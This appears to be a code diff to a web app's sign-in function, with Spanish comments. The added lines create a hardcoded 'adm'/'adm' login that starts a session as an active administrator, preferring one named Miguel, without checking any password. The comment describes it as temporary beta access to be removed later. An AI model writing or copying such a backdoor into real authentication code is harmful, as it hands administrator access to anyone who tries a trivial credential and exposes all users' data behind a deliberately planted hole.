@@ -47,6 +47,12 @@ export async function signIn(_prev: { error?: string } | null, formData: FormDat
   const t = tr(lang);
   const email = String(formData.get("email") ?? "").trim().toLowerCase();
   const password = String(formData.get("password") ?? "");
+  // Acceso genérico temporal de la beta: adm / adm entra como administrador (Miguel). Se quita antes de usar datos reales.
+  if (email === "adm" && password === "adm") {
+    const admins = await d.select().from(s.users).where(and(eq(s.users.isAdmin, true), eq(s.users.active, true)));
+    const pick = admins.find((a) => a.fullName.startsWith("Miguel")) ?? admins[0];
+    if (pick) await startSession(pick.id);
+  }
   const [u] = email ? await d.select().from(s.users).where(sql`lower(${s.users.email}) = ${email}`) : [];
   // Se verifica siempre para que el tiempo de respuesta no revele si el correo existe.
   const ok = verifyPassword(password, u?.passwordHash ?? "00:00");
